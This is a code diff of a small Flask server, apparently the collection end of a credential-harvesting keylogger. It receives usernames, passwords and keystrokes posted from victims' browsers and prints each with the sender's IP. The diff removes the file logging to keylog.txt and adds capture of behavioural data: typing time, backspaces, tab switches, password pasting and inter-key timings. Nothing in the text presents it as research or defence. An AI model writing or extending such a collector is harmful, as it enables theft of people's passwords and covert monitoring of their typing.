@@ -4,14 +4,21 @@ import datetime
 app = Flask(__name__)
 
 @app.route('/_api_/', methods=['POST'])
-def log_keypress():
+def log_behavior():
     data = request.get_json()
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    print(f">> Capturado desde IP {user_ip}: Usuario: {data.get('u')}, Clave: {data.get('p')}, Teclas: {data.get('k')}")
+    print("\n>> Comportamiento del usuario detectado:")
+    print(f"IP: {user_ip}")
+    print(f"Usuario: {data.get('u')}")
+    print(f"Clave: {data.get('p')}")
+    print(f"Teclas: {data.get('k')}")
+    print(f"Tiempo total escribiendo: {data.get('tiempo_total')} ms")
+    print(f"Cantidad de backspaces: {data.get('backspaces')}")
+    print(f"Cambios de pestaña: {data.get('cambio_pestanas')}")
+    print(f"¿Pegó la clave?: {'Sí' if data.get('pegado_clave') else 'No'}")
+    print(f"Tiempos entre teclas: {data.get('tiempos_teclas')}\n")
 
-    with open("keylog.txt", "a") as f:
-        f.write(f"[{datetime.datetime.now()}] IP: {user_ip} | Usuario: {data.get('u')}, Clave: {data.get('p')}, Teclas: {data.get('k')}\n")
     return '', 204
 
 if __name__ == '__main__':
